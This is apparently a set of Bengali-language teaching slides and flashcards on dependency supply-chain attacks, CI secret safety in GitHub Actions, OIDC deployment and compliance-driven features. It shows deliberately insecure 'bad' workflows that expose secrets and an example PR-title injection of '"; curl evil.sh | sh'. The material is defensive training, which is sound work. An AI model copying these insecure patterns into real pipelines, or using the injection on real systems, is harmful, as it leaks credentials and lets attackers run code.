slides:
  - slug: poisoned-sack
    title: 'চালের বস্তায় ভেজাল: ভেতরের লাইব্রেরি'
    kind: story
    tldr: 'আপনার অ্যাপের বেশির ভাগ কোড, প্রায়ই ৮০–৯০%, অন্যের লেখা; কোনো একটা library বিষাক্ত হলে সেটা নিজে থেকেই আপনার প্রোডাকশনে চলে আসে।'
    keywords: ['supply chain attack', 'dependency', 'Packagist', 'typosquatting', 'transitive dependency', 'সাপ্লাই চেইন']
    blocks:
      - type: metaphor
        icon: box
        title: 'পাইকারি থেকে কেনা চালের বস্তা'
        body: |
          বিয়েবাড়ির বাবুর্চি নিজে ধান ফলায় না; পাইকারের কাছ থেকে চাল কিনে রান্না করে। পাইকারের বস্তায় কেউ ভেজাল মিশিয়ে দিলে বাবুর্চি না জেনেই হাজার মানুষকে সেই খাবার খাওয়ায়। `composer require` ঠিক তা-ই: আপনি অন্যের কোড কিনে নিজের অ্যাপে বসান, আর সেই কোডের ভেতরের কোডও সাথে আসে।
      - type: visual
        kind: flow
        caption: 'একটা বিষাক্ত নতুন ভার্সন কীভাবে প্রোডাকশনে পৌঁছায়'
        nodes:
          - {id: attacker, label: 'আক্রমণকারী', sub: 'library-র মালিকের account দখল', icon: bug, tone: bad, col: 0, row: 1, tip: 'maintainer-এর (library-র মালিকের) ভুলে বা পাসওয়ার্ড চুরিতে অ্যাকাউন্ট হাতে নেয়, অথবা মিলে যাওয়া নামে নকল package বানায় (typosquatting)।'}
          - {id: registry, label: 'Packagist', sub: 'package registry', icon: archive, col: 1.5, row: 1, tip: 'সবার library যেখান থেকে নামে। নতুন ভার্সন এলে বিশ্বাস করে ইনস্টল হয়ে যায়।'}
          - {id: ci, label: 'CI / deploy', sub: 'composer update', icon: gear, tone: warn, col: 3, row: 1, tip: 'lock file না মানলে এখানে সবচেয়ে নতুন ভার্সন, অর্থাৎ বিষাক্তটাই, টেনে আনে।'}
          - {id: prod, label: 'প্রোডাকশন', sub: 'আপনার সার্ভার', icon: server, tone: bad, col: 4, row: 0, tip: 'ক্ষতিকর কোড এখন আপনার সার্ভারের অনুমতি নিয়ে চলছে, আপনার secret-ও পড়তে পারে।'}
        edges:
          - {from: attacker, to: registry, label: 'নতুন ভার্সনে ক্ষতিকর কোড মিশিয়ে প্রকাশ করে', tone: bad}
          - {from: registry, to: ci, label: 'CI নতুন ভার্সন টেনে আনে, কারণ ভার্সন আটকানো নেই', tone: warn}
          - {from: ci, to: prod, label: 'ক্ষতিকর কোডসহ অ্যাপ deploy হয়ে যায়', tone: bad}
      - type: quote
        body: 'আপনি যে কোড নিজে লেখেননি, তার দায়ও আপনার; নতুন library মানে নতুন বিশ্বাস।'
    aside:
      - type: story
        title: 'ছোট library, বড় ঘটনা'
        body: 'একটা জনপ্রিয় JavaScript library-র মালিক ক্লান্ত হয়ে প্রকল্পটা এক অচেনা লোককে দিয়ে দিয়েছিল। নতুন মালিক পরের ভার্সনে এমন কোড ঢোকাল, যা ক্রিপ্টো ওয়ালেট থেকে টাকা চুরি করত। অগণিত প্রকল্পের নির্ভরতার ভেতরে সেটা প্রায় দুই মাস লুকিয়ে ছিল, কেউ টেরই পায়নি।'
      - type: terms
        items:
          - {term: 'Transitive dependency', meaning: 'আপনি যে library নিয়েছেন, সেটা যার ওপর নির্ভর করে: আপনার না-জানা পরোক্ষ নির্ভরতা।'}
          - {term: 'Typosquatting', meaning: 'জনপ্রিয় নামের প্রায় একই নামে নকল package বানিয়ে ভুল টাইপের অপেক্ষা।'}
    check:
      q: 'আপনি মাত্র ১০টা package নিয়েছেন, তবু vendor/-এ কয়েকশো কেন, আর এতে ঝুঁকি কেন বাড়ে?'
      a: 'প্রতিটা package নিজের নির্ভরতা (transitive) আনে। যত বেশি কোড বাইরের, তত বেশি লোকের ভুল বা দুর্বলতা আপনার প্রোডাকশনে পৌঁছাতে পারে।'

  - slug: lock-and-audit
    title: 'Lock file, audit আর নিয়মিত হালনাগাদ'
    kind: howto
    tldr: 'composer.lock commit করুন, CI-তে `install` চালান (`update` নয়), প্রতি build-এ `composer audit` দিন, আর আপডেট চলুক ছোট ছোট ধাপে।'
    keywords: ['composer.lock', 'composer audit', 'Dependabot', 'Renovate', 'yarn audit', 'lock file', 'vulnerability']
    blocks:
      - type: metaphor
        icon: tag
        title: 'চালের ব্যাচ নম্বর'
        body: |
          ভালো দোকানি প্রতি বস্তায় ব্যাচ নম্বর রাখে। ভেজাল ধরা পড়লে সে দেখে ফেলতে পারে কোন ব্যাচ কার কাছে গেছে। `composer.lock` হলো সেই ব্যাচ নম্বর: ঠিক কোন ভার্সন, কোন commit-এর কোড নেওয়া হয়েছে। এটা ছাড়া প্রতিটা build আলাদা, না-দেখা চাল নিয়ে আসে।
      - type: points
        title: 'চার নিয়ম'
        style: check
        items:
          - '`composer.lock` আর `yarn.lock` commit করুন; production-এ যা চলছে, ঠিক সেটাই CI-তে test হয়।'
          - 'CI আর deploy-এ `composer install` (lock মেনে), `composer update` শুধু ডেভেলপারের হাতে, PR-এ।'
          - 'প্রতি build-এ `composer audit` আর Yarn-এর audit: জানা দুর্বলতা পেলে build ভাঙে।'
          - 'Dependabot বা Renovate দিয়ে সপ্তাহে ছোট ছোট আপডেট; বছরে একবার বিশাল আপডেট নয়।'
      - type: code
        lang: yaml
        file: '.github/workflows/ci.yaml'
        variant: good
        code: |
          name: ci
          on: [pull_request]
          permissions:
            contents: read
          jobs:
            test:
              runs-on: ubuntu-latest
              steps:
                - uses: actions/checkout@<পুরো-commit-SHA>   # tag নয়, SHA দিয়ে আটকানো
                - uses: shivammathur/setup-php@<পুরো-commit-SHA>
                  with:
                    php-version: '8.3'
                - run: composer install --no-interaction --prefer-dist
                - run: composer audit --locked
                - run: yarn install --immutable
                - run: yarn npm audit --severity high
        marks:
          - {line: 4, tip: 'job-এর ডিফল্ট অনুমতি শুধু পড়া। যে step-এ লেখার দরকার, শুধু সেখানে বাড়ান।'}
          - {line: 9, tip: 'Tag (v4) সরিয়ে অন্য কোডে নেওয়া যায়; commit SHA বদলানো যায় না। তাই CI-র ভেতরের action-ও SHA দিয়ে আটকান।'}
          - {line: 14, tip: '--locked মানে lock file-এর ভার্সনগুলোই যাচাই হয়, নতুন সমাধান না করে। দুর্বলতা পেলে exit code অ-শূন্য, build ভাঙে।'}
          - {line: 15, tip: '--immutable lock file বদলাতে দেয় না: ভার্সন সরে গেলে build ব্যর্থ।'}
      - type: quote
        body: 'CI-তে install, update নয়; আর প্রতিটা build-এ audit।'
    aside:
      - type: commands
        title: 'Composer নিরাপত্তা কমান্ড'
        items:
          - {cmd: 'composer audit', desc: 'জানা দুর্বলতার তালিকা (security advisories)'}
          - {cmd: 'composer outdated --direct', desc: 'আপনার নেওয়া package-গুলোর কোনটা পুরনো'}
          - {cmd: 'composer why symfony/yaml', desc: 'কে এই package টেনে এনেছে'}
          - {cmd: 'composer install --no-dev --classmap-authoritative', desc: 'প্রোডাকশন install: dev-package ছাড়া'}
      - type: pitfalls
        items:
          - 'lock করার একটা দাম আছে: সংশোধন আর নিজে থেকে আসে না। Dependabot বা Renovate না থাকলে lock-করা অ্যাপ বছরের পর বছর দুর্বল ভার্সনে পড়ে থাকতে পারে।'
          - 'audit শুধু আগে রিপোর্ট হওয়া দুর্বলতা চেনে। এক ঘণ্টা আগে প্রকাশ হওয়া বিষাক্ত release সে ধরতে পারে না।'
      - type: tips
        items:
          - 'নতুন library নেওয়ার আগে দেখুন: কতজন মেইনটেইনার, শেষ release কবে, কত issue খোলা পড়ে আছে। তারপরও দরকার কি না ভাবুন।'
          - 'package-এর নাম দুবার পড়ুন: symfony/yaml আর symfony-yaml/yaml এক নয়।'
      - type: refs
        items:
          - {to: 'infra/ci-cd', label: 'CI/CD পাইপলাইন'}
    check:
      q: 'CI-তে `composer update` চালালে কী বিপদ, আর `composer install` কেন ভালো?'
      a: '`update` build-এর সময়ের সবচেয়ে নতুন ভার্সন টানে, তাই test হওয়া কোড আর deploy হওয়া কোড আলাদা হতে পারে। `install` lock-এর ঠিক ভার্সনই আনে।'

  - slug: ci-secrets
    title: 'CI পাইপলাইনও একটা চাবির ঘর'
    kind: pitfall
    tldr: 'CI এমন কোড চালায় যা আপনি পড়েননি, আর তার কাছেই থাকে deploy-এর চাবি। secret আর অপরীক্ষিত কোড কখনো একই job-এ নয়।'
    keywords: ['CI secrets', 'GitHub Actions', 'pull_request_target', 'fork pull request', 'least privilege', 'pipeline security']
    blocks:
      - type: metaphor
        icon: key
        title: 'দোকানের ক্যাশবাক্সের চাবি'
        body: |
          দোকানে নতুন কর্মী এলে তাকে ক্যাশবাক্সের মূল চাবি দেওয়া হয় না। দেওয়া হয় একদিনের জন্য, শুধু তার কাউন্টারের বাক্সের চাবি। CI হলো সেই কর্মী: যে কোডই আসুক, সে চালায়, আর কিছু কোড খারাপ। চাবি আর অচেনা লোক একই কাউন্টারে না বসলেই ক্যাশবাক্স নিরাপদ।
      - type: points
        title: 'CI-র secret আসলে কোথায় ফাঁস হয়'
        style: cross
        items:
          - '`pull_request_target` workflow যখন PR-এর কোড checkout করে: secret আপনার, কোড অচেনা লোকের। (সাধারণ `pull_request` fork-এর PR-কে secret দেয় না।)'
          - 'নিজের repo-র branch থেকে আসা PR secret পায় এবং workflow ফাইলটাই বদলাতে পারে। একজন সহকর্মীর account চুরি হলেই যথেষ্ট।'
          - 'job-এর ভেতরের বিষাক্ত library বা action। সে আপনার কোডের মতোই একই secret নিয়ে চলে।'
      - type: code
        lang: yaml
        file: '.github/workflows/test.yaml'
        variant: bad
        code: |
          on: pull_request_target
          jobs:
            test:
              runs-on: ubuntu-latest
              steps:
                - uses: actions/checkout@v4
                  with:
                    ref: ${{ github.event.pull_request.head.sha }}
                - run: composer install && vendor/bin/phpunit
                  env:
                    AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        marks:
          - {line: 1, tip: 'pull_request_target আপনার secret-সহ চলে, PR অচেনা লোকের fork থেকে এলেও।'}
          - {line: 8, tip: 'এখানে checkout হচ্ছে অচেনা লোকের কোড, আপনার নয়।'}
          - {line: 9, tip: 'composer install PR-এর composer.json script চালায়, phpunit PR-এর test লোড করে: অচেনা কোডের পরিবেশেই key রাখা।'}
      - type: code
        lang: yaml
        file: '.github/workflows/test.yaml'
        variant: good
        code: |
          on: pull_request
          permissions:
            contents: read
          jobs:
            test:
              runs-on: ubuntu-latest
              steps:
                - uses: actions/checkout@<পুরো-commit-SHA>
                - run: composer install --no-interaction
                - run: vendor/bin/phpunit    # এই job-এ কোনো secret নেই, চুরির মতো কিছুই নেই
        marks:
          - {line: 1, tip: 'সাধারণ pull_request: fork-এর PR-এর জন্য GitHub secret আটকে রাখে আর token শুধু-পড়া করে দেয়।'}
          - {line: 2, tip: 'নিজের repo-র branch হলেও job-এর token শুধু পড়তে পারে।'}
          - {line: 10, tip: 'test চলে নকল বা sandbox মান দিয়ে। আসল deploy key থাকে আলাদা workflow-এ (পরের slide)।'}
      - type: quote
        body: 'secret শুধু সেই কোডের সামনে যায়, যা review হয়ে merge হয়েছে।'
    aside:
      - type: pitfalls
        items:
          - 'PR-এর লেখা সরাসরি shell step-এ বসানো: `run: echo "${{ github.event.pull_request.title }}"`। শিরোনামে `"; curl evil.sh | sh` থাকলে সেটা কমান্ড হয়ে চলে। `env:` দিয়ে পাঠান।'
          - 'তৃতীয় পক্ষের action-কে tag দিয়ে ডাকা (@v1); মালিক tag সরালে অন্য কোড চলে। commit SHA দিয়ে আটকান।'
          - 'একটাই admin-অধিকারের token সব repository-তে।'
      - type: tips
        items:
          - 'এর দাম: আসল secret লাগে এমন test (যেমন টাকা লাগা API) fork-এর PR-এ চলবে না। test-কে নকল বা sandbox key দিন; কোড পড়ে maintainer নিজে আবার চালাবেন।'
      - type: refs
        items:
          - {to: 'security/secrets-management', label: 'Secret ও rotation'}
    check:
      q: 'এক অচেনা লোক আপনার repo fork করে PR খুলল। কোন trigger-এ তার কোড আপনার secret পড়তে পারে, আর সাধারণ `pull_request`-এ কেন নয়?'
      a: 'যে `pull_request_target` PR-এর কোড checkout করে, সেটা secret-সহ চলে। সাধারণ `pull_request` fork-এর PR থেকে secret আটকে রাখে।'

  - slug: oidc-deploy
    title: 'মেয়াদি deploy key: OIDC আর protected branch'
    kind: howto
    tldr: 'deploy হোক শুধু main-এ merge-এর পর, আর জমানো cloud key-র বদলে OIDC: এক ঘণ্টার credential, একটা ছোট role-এ সীমিত।'
    keywords: ['OIDC', 'GitHub Actions deploy', 'short-lived credentials', 'trust policy', 'protected branch', 'environment']
    blocks:
      - type: text
        body: |
          জমানো access key হলো দরজার পাপোশের নিচে রাখা বাড়ির চাবি: যেকোনো জায়গা থেকে, বছরের পর বছর কাজ করে। **OIDC** হলো অফিসের গেটের ভিজিটর পাস। প্রতি run-এ GitHub একটা ছোট চিরকুটে সই করে: "repo shop, branch main, environment production"। ক্লাউড চিরকুটটা আপনার লেখা নিয়মের (trust policy) সাথে মিলিয়ে এমন একটা key দেয়, যা এক ঘণ্টার মতো পরে মরে যায়।

          এর দাম: ক্লাউড account-এ trust নিয়মটা একবার বসানোর ঝামেলা, আর OIDC চলে এমন ক্লাউড লাগে। নিয়মে আপনার ঠিক repo আর environment-এর নাম থাকতে হবে, নইলে অন্য repo-র workflow-ও role ধার নিতে পারে।
      - type: code
        lang: yaml
        file: '.github/workflows/deploy.yaml'
        variant: bad
        code: |
          on: [push, pull_request]
          jobs:
            deploy:
              runs-on: ubuntu-latest
              steps:
                - uses: actions/checkout@v4
                - run: echo "key is ${{ secrets.AWS_SECRET_ACCESS_KEY }}"
                - run: ./deploy.sh
                  env:
                    AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
                    AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        marks:
          - {line: 1, tip: 'প্রতিটা PR-এ deploy চলে। নিজের repo-র branch-এর PR secret পায় আর এই ফাইলটাই বদলে সেগুলো ছাপাতে পারে।'}
          - {line: 7, tip: 'secret echo করা: masking এড়ানোর নানা পথ আছে (base64 করে ছাপা), log-এ ফাঁস।'}
          - {line: 11, tip: 'দীর্ঘমেয়াদি access key: চুরি গেলে বছরের পর বছর কাজ করে।'}
      - type: code
        lang: yaml
        file: '.github/workflows/deploy.yaml'
        variant: good
        code: |
          on:
            push:
              branches: [main]
          permissions:
            id-token: write
            contents: read
          jobs:
            deploy:
              environment: production
              runs-on: ubuntu-latest
              steps:
                - uses: actions/checkout@<পুরো-commit-SHA>
                - uses: aws-actions/configure-aws-credentials@<পুরো-commit-SHA>
                  with:
                    role-to-assume: arn:aws:iam::123456789012:role/shop-deploy
                    aws-region: ap-southeast-1
                - run: ./deploy.sh
        marks:
          - {line: 3, tip: 'শুধু main-এ push হলে, review-এর পর deploy; PR বা fork-এর কোড কখনো secret ছোঁয় না।'}
          - {line: 5, tip: 'id-token: write মানে OIDC: GitHub প্রতি run-এর জন্য একটা অস্থায়ী প্রমাণ দেয়, ক্লাউড তা দেখে ঘণ্টাখানেকের credential বানায়।'}
          - {line: 9, tip: 'environment: production-এ manual approval আর আলাদা secret বসানো যায়।'}
          - {line: 15, tip: 'role-টা শুধু deploy করতে পারে (least privilege), আর তার trust policy কেবল এই repo আর environment-কে মানে।'}
      - type: quote
        body: 'CI-র কাছে চাবি যত কম মেয়াদের আর যত ছোট, ফাঁসের ক্ষতি তত কম।'
    aside:
      - type: terms
        items:
          - {term: 'OIDC', meaning: 'OpenID Connect: জমানো পাসওয়ার্ডের বদলে মেয়াদি সই-করা চিরকুট দিয়ে নিজের পরিচয় প্রমাণ।'}
          - {term: 'Trust policy', meaning: 'ক্লাউড account-এর নিয়ম: কোন repo, branch বা environment কোন role ধার নিতে পারবে।'}
      - type: tips
        items:
          - 'main-কে protect করুন: merge-এর আগে review-করা PR বাধ্যতামূলক, যাতে deploy job-এ শুধু যাচাই-করা কোড পৌঁছায়।'
          - 'ক্লাউডে OIDC না থাকলে key-টা manual approval-সহ environment secret-এ রাখুন আর ঘনঘন বদলান।'
      - type: refs
        items:
          - {to: 'security/secrets-management', label: 'Secret ও rotation'}
    check:
      q: 'CI log থেকে deploy key ফাঁস হলো। জমানো access key-র তুলনায় OIDC-তে চোর কেন অনেক কম পায়?'
      a: 'OIDC credential এক ঘণ্টার মতো পরে মরে যায় আর শুধু একটা ছোট role-এ চলে। জমানো key কেউ টের পেয়ে বদলানো পর্যন্ত বছরের পর বছর চলে।'

  - slug: compliance-inputs
    title: 'SOC 2, PCI DSS, GDPR, HIPAA: নিয়ম নয়, নকশার ইনপুট'
    kind: concept
    tldr: 'Compliance পরে লাগানো কাগজ নয়; কোন ডেটা ছোঁন তার ওপর নির্ভর করে কোন নিয়ম আসে, আর সেই নিয়ম নকশার শুরুতেই বলে দেয় কী বানাতে হবে।'
    keywords: ['SOC 2', 'PCI DSS', 'GDPR', 'HIPAA', 'compliance', 'audit', 'কমপ্লায়েন্স']
    blocks:
      - type: metaphor
        icon: receipt
        title: 'রেস্তোরাঁর হাইজিন সনদ'
        body: |
          খাবারের দোকানের সনদ পেতে রান্নাঘরের নকশাই বদলাতে হয়: আলাদা কাঁচা-পাকা বোর্ড, ঢাকনা, হাত ধোয়ার জায়গা। রান্নাঘর বানানোর পর এসব বসানো কঠিন আর দামি। Compliance-ও তা-ই: যে নিয়ম মানতে হবে তা আগে জেনে নকশা করলে খরচ কম।
      - type: text
        body: |
          বড় এক ক্রেতা বলল: "SOC 2 রিপোর্ট দেখালে চুক্তি করব।" অডিটর তিন মাসের প্রমাণ চায়: কে কোন রেকর্ড দেখেছে। আপনার কোনো log-ই নেই। এখন log বসাতে হলে প্রতিটা controller ছুঁতে হবে, আর হারানো তিন মাস আর ফেরানো যাবে না।
      - type: visual
        kind: table
        caption: 'চার নিয়ম: কখন লাগে, নকশায় কী চাপ ফেলে'
        headers: ['নিয়ম', 'কখন লাগে', 'নকশায় কী চাপ']
        rows:
          - cells: ['SOC 2', 'B2B ক্রেতা অডিট রিপোর্ট চায়', 'access review, audit log, change নিয়ম']
            tip: 'স্বাধীন অডিটরের রিপোর্ট: আপনার নিরাপত্তা নিয়ন্ত্রণ আছে কি না। Type II-তে কয়েক মাস ধরে সেগুলো সত্যিই চলেছে কি না, তার প্রমাণ লাগে।'
          - cells: ['PCI DSS', 'কার্ডের তথ্য ছুঁলে', 'কার্ড না ছোঁয়া, tokenization, বিচ্ছিন্ন নেটওয়ার্ক']
            tip: 'সবচেয়ে সহজ পথ: কার্ড কখনো নিজের সার্ভারে না আনা (provider-এর hosted form)। তাহলে নিয়মের পরিধি ছোট হয়।'
          - cells: ['GDPR', 'EU-র মানুষের ব্যক্তিগত তথ্য', 'মুছে ফেলা, export, সম্মতি, ৭২ ঘণ্টায় ফাঁসের জানানো']
            tip: 'ব্যবহারকারীর অধিকার (দেখা, ঠিক করা, মোছা) ফিচার হিসেবে বানাতে হয়। ডেটা ফাঁসের খবর অথরিটিকে ৭২ ঘণ্টার মধ্যে।'
          - cells: ['HIPAA', 'মার্কিন স্বাস্থ্য তথ্য (PHI)', 'এনক্রিপশন, access log, vendor চুক্তি (BAA)']
            tip: 'মার্কিন স্বাস্থ্যসেবা ডেটার জন্য। কে কোন রোগীর তথ্য দেখেছে তার log রাখা আর সব তৃতীয় পক্ষের সাথে চুক্তি লাগে।'
      - type: quote
        body: 'কোন ডেটা ছুঁচ্ছেন, তা-ই ঠিক করে কোন নিয়ম লাগবে; কম ডেটা ছুঁলে নিয়ম কম।'
    aside:
      - type: pitfalls
        items:
          - 'Compliance মানেই নিরাপদ নয়: সনদ থাকা মানে নিয়মের তালিকা পূরণ, আক্রমণ ঠেকানোর নিশ্চয়তা নয়।'
          - 'আইনের ব্যাখ্যা প্রকৌশলীর কাজ নয়। এখানে সাধারণ ধারণা দেওয়া হয়েছে; আপনার ক্ষেত্রে কী প্রযোজ্য তা আইন বা compliance বিভাগের সাথে ঠিক করুন।'
      - type: terms
        items:
          - {term: 'SOC 2 Type I/II', meaning: 'Type I: একটা দিনে নিয়ন্ত্রণ আছে কি না। Type II: কয়েক মাস ধরে সেগুলো ঠিকঠাক চলেছে কি না।'}
          - {term: 'PHI', meaning: 'Protected Health Information: রোগীর পরিচয়যুক্ত স্বাস্থ্য তথ্য।'}
      - type: refs
        items:
          - {to: 'security/data-protection', label: 'এনক্রিপশন আর PII'}
    check:
      q: 'কার্ডের তথ্য নিজের সার্ভারে না এনে provider-এর hosted form ব্যবহার করলে PCI-র দিক থেকে কী লাভ?'
      a: 'কার্ড নম্বর কখনো আমাদের সিস্টেমে আসে না, তাই PCI নিয়মের পরিধি (scope) অনেক ছোট হয়। যা ছুঁই না, তার দায়ও কম।'

  - slug: compliance-to-code
    title: 'নিয়ম থেকে ফিচার: যা নকশায় যোগ করতে হয়'
    kind: recap
    tldr: 'চার নিয়মের প্রায় সবই কয়েকটা সাধারণ ফিচারে নামে: audit log, access review, এনক্রিপশন, মুছে ফেলা/export, আর ফাঁস হলে করণীয়ের runbook।'
    keywords: ['audit log', 'right to erasure', 'data retention', 'anonymize', 'breach runbook', 'compliance controls']
    blocks:
      - type: visual
        kind: steps
        caption: 'নিয়ম মানার পাঁচটা সাধারণ প্রকৌশল-ফিচার'
        steps:
          - {title: '১. Audit log', body: 'কে, কখন, কী করল, বদলানো যায় না এমনভাবে', tip: 'SOC 2, HIPAA আর GDPR তিনটাই চায়। ভুল হলে কে করল বলতে পারা চাই।'}
          - {title: '২. Access review', body: 'প্রতি ত্রৈমাসিকে কার কী অধিকার, দেখে ছাঁটাই', tip: 'চাকরি ছেড়ে যাওয়া বা বদলি হওয়া লোকের পুরনো অধিকার সবচেয়ে বড় ফাঁক।'}
          - {title: '৩. এনক্রিপশন', body: 'পথে, ডিস্কে আর সংবেদনশীল ক্ষেত্রে', tip: 'নিয়ম "সাধারণ লেখায় রাখবেন না" বলে। কোন স্তরে, তা ডেটার ধরন ঠিক করে।'}
          - {title: '৪. মোছা ও export', body: 'ব্যবহারকারী চাইলে ডেটা দেখান, মুছে দিন', tip: 'GDPR-এর অধিকার। ledger-এর মতো আইনি রেকর্ড মোছা যায় না, তাই anonymize করা হয়।'}
          - {title: '৫. ফাঁসের runbook', body: 'কে জানাবে, কাকে, কত সময়ের মধ্যে', tip: 'GDPR-এ অথরিটিকে ৭২ ঘণ্টা। ঘটনার রাতে ভাবতে বসলে দেরি হয়, তাই আগে লিখে রাখুন।'}
      - type: code
        lang: php
        file: 'src/Privacy/UserEraser.php'
        variant: bad
        code: |
          $this->em->remove($user);
          $this->em->flush();
          // হয় অর্ডারের foreign key আটকায়, নয়তো cascade আইনত-রাখার টাকার রেকর্ডও মুছে দেয়।
          // আর কে মুছতে বলল, audit log-এ তা-ও নেই।
      - type: code
        lang: php
        file: 'src/Privacy/UserEraser.php'
        variant: good
        code: |
          public function erase(User $user, User $requestedBy): void
          {
              // টাকার লেনদেন ledger-এ থাকবে (আইনি দায়), কিন্তু ব্যক্তি মুছে যাবে
              $user->anonymize();
              $this->em->flush();

              $this->auditLogger->info('user.erased', [
                  'user_id' => $user->getId(),
                  'requested_by' => $requestedBy->getId(),
              ]);
          }

          // User entity-র ভেতরে
          public function anonymize(): void
          {
              $this->email = sprintf('deleted-%d@invalid.example', $this->id);
              $this->name = 'মুছে ফেলা ব্যবহারকারী';
              $this->phone = null;
              $this->erasedAt = new \DateTimeImmutable();
          }
        marks:
          - {line: 4, tip: 'সারি মুছি না, শনাক্ত করার তথ্য মুছি। অর্ডার আর টাকার হিসাবের foreign key ঠিক থাকে।'}
          - {line: 7, tip: 'মোছার কাজেরও রেকর্ড: কে কার ডেটা মুছতে বলল, তার প্রমাণ থাকা চাই।'}
          - {line: 16, tip: 'invalid.example একটা সংরক্ষিত ডোমেইন, ইমেইল কখনো কারও কাছে পৌঁছাবে না।'}
    aside:
      - type: remember
        body: 'নিয়ম পড়ে ফিচার বানান: log, access, এনক্রিপশন, মোছা, ফাঁসের পরিকল্পনা।'
      - type: tips
        items:
          - 'বদলানো-যায়-না এমন log: audit টেবিলে অ্যাপের ডেটাবেস user-কে INSERT দিন, UPDATE-DELETE নয়; নয়তো log আলাদা storage-এ পাঠান।'
          - 'শুধু users টেবিল anonymize করা যথেষ্ট নয়। ঠিকানা, search index, analytics আর backup-এ কপি লুকিয়ে থাকে; সেগুলোও মুছুন বা মেয়াদ দিন।'
      - type: when
        use:
          - 'ক্রেতা বা আইন যখন নিয়ম চায়: আগে ডেটার ধরন ঠিক করে প্রযোজ্য নিয়ম বেছে নিন।'
        avoid:
          - 'সব নিয়ম একসাথে মানার চেষ্টা; আগে সবচেয়ে ঝুঁকিপূর্ণ ডেটার জন্য যেটা লাগে, সেটা।'
      - type: refs
        items:
          - {to: 'recovery/corrective-actions', label: 'সংশোধন ও audit'}
    check:
      q: 'ব্যবহারকারী "আমার ডেটা মুছে দিন" বলল, কিন্তু তার অর্ডারের টাকার রেকর্ড আইনত রাখতে হবে। কী করবেন?'
      a: 'সারি মুছবেন না; নাম, ইমেইল, ফোনের মতো শনাক্তকারী তথ্য anonymize করুন, আর টাকার রেকর্ড রেখে দিন। মোছার ঘটনাটাও audit log-এ লিখুন।'

flashcards:
  - q: 'Supply chain attack কী?'
    a: 'আপনার ব্যবহৃত বাইরের library বা tool-এ ক্ষতিকর কোড ঢুকিয়ে, আপনার সিস্টেমে ঢোকার চেষ্টা।'
    more: |
      আক্রমণকারী আপনার অ্যাপে সরাসরি না ঢুকে আপনার নির্ভরতার কারো অ্যাকাউন্ট দখল করে বা নকল package বানায়। নতুন ভার্সনের সাথে ক্ষতিকর কোড নিজে থেকেই আপনার অ্যাপে চলে আসে। তাই library নেওয়া মানে একটা বিশ্বাস বাড়ানো।
    ref: poisoned-sack
  - q: 'Transitive dependency কী?'
    a: 'আপনার নেওয়া library যে অন্য library-র ওপর নির্ভর করে, সেটা। আপনি সরাসরি চাননি, তবু সেটা চলে।'
    more: |
      `composer require` একটা নিলে তার নির্ভরতাগুলোও vendor/-এ আসে। `composer why <package>` বলে কে সেটা টেনে এনেছে। ঝুঁকি বোঝার জন্য শুধু নিজের নেওয়া তালিকা দেখলে হয় না।
    ref: poisoned-sack
  - q: 'composer.lock কেন commit করতে হয়?'
    a: 'যাতে প্রতিটা build, test আর production ঠিক একই ভার্সনের library ব্যবহার করে।'
    more: |
      lock file ছাড়া `composer install` সবচেয়ে নতুন ভার্সন খোঁজে, আর যা test করেছেন আর যা deploy হলো তা আলাদা হয়ে যায়। lock file-এর ভার্সন যাচাই করে আপনি জানতে পারেন কোন ভার্সনে দুর্বলতা আছে।
    ref: lock-and-audit
  - q: 'CI-তে `composer install` আর `composer update`-এর পার্থক্য কী?'
    a: '`install` lock file-এর ভার্সনই আনে। `update` সবচেয়ে নতুন ভার্সন টানে আর lock file বদলে দেয়।'
    more: |
      `update` চলবে ডেভেলপারের কম্পিউটারে, একটা আলাদা PR-এ, যেখানে লোকে বদলটা দেখে review করতে পারে। CI আর প্রোডাকশন deploy-এ সবসময় `install`।
    ref: lock-and-audit
  - q: '`composer audit` কী করে?'
    a: 'lock file-এর package-গুলোর বিরুদ্ধে জানা দুর্বলতার (security advisory) তালিকা মেলায়। পেলে অ-শূন্য exit code দেয়।'
    more: |
      CI-তে `composer audit --locked` চালালে দুর্বল package থাকলে build ভেঙে যায়। এতে সাথে সাথে জানা যায়। frontend-এর জন্য Yarn-এর audit আলাদা চালাতে হয়। আর audit শুধু জানা দুর্বলতা ধরে, নতুন আবিষ্কার নয়।
    ref: lock-and-audit
  - q: 'CI পাইপলাইনের secret নিরাপদ রাখার তিনটা নিয়ম কী?'
    a: 'স্বল্পমেয়াদি (OIDC) credential, ন্যূনতম অধিকার, আর শুধু protected branch-এ secret দেওয়া।'
    more: |
      দীর্ঘমেয়াদি access key CI-তে রাখলে চুরি গেলে বছরের পর বছর কাজ করে। OIDC-তে প্রতি run-এ ঘণ্টাখানেকের credential মেলে। অপরীক্ষিত কোডের হাতে secret দেবেন না, আর secret কখনো echo করবেন না।
    ref: oidc-deploy
  - q: 'সাধারণ `pull_request` trigger-এ fork-এর PR কি আপনার secret পায়?'
    a: 'না: GitHub secret আটকে রাখে আর token শুধু-পড়া করে দেয়। বিপদ `pull_request_target`-এ, যখন সেটা PR-এর কোড checkout করে।'
    more: |
      `pull_request_target` মূল repo-র workflow চালায় তার secret-সহ, fork-এর PR হলেও। job যদি তারপর PR-এর কোড (composer script, test) checkout করে চালায়, তবে অচেনা লোকের কোডের হাতে আপনার চাবি। অপরীক্ষিত কোড চালান secret-ছাড়া workflow-এ, আর deploy চালান আলাদা workflow-এ।
    ref: ci-secrets
  - q: 'GitHub Actions-এ action-কে commit SHA দিয়ে আটকানো হয় কেন?'
    a: 'Tag (যেমন v4) মালিক সরাতে পারে, SHA পারে না। SHA দিলে সবসময় একই কোড চলে।'
    more: |
      তৃতীয় পক্ষের action আপনার CI-তে secret-সহ চলে। মালিকের account দখল হলে tag বদলে ক্ষতিকর কোড বসানো যায়। SHA আটকে রাখলে আপডেট করার সময় আপনি দেখে-বুঝে বদলান।
    ref: ci-secrets
  - q: 'GDPR-এর কোন দুটো নিয়ম নকশায় সবচেয়ে বেশি চাপ ফেলে?'
    a: 'ব্যবহারকারীর ডেটা মুছে ফেলা ও export করার অধিকার, আর ফাঁসের খবর অথরিটিকে ৭২ ঘণ্টার মধ্যে জানানো।'
    more: |
      প্রথমটার জন্য ডেটা কোথায় কোথায় আছে তা জানতে হয় আর anonymize বা মোছার ফিচার বানাতে হয়। দ্বিতীয়টার জন্য আগে থেকে ফাঁসের runbook লিখে রাখতে হয়। এটা আইনের শর্ত।
